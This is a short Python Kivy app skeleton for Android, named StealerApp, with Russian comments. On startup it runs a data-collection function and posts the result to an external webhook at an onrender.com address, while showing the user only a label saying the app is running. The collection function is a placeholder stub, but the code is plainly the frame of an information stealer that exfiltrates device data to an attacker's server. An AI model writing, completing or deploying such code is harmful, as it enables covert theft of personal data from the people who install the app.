import android
import requests
import json
from kivy.app import App
from kivy.uix.label import Label

class StealerApp(App):
    def build(self):
        # Здесь код сбора данных
        # Отправка на сервер
        server_url = "https://zonastealer-bot.onrender.com/webhook"
        data = self.collect_data()
        requests.post(server_url, json=data)
        return Label(text="Приложение запущено")
    
    def collect_data(self):
        # Функция сбора данных
        return {"data": "собранные_данные"}

if __name__ == "__main__":
    StealerApp().run()
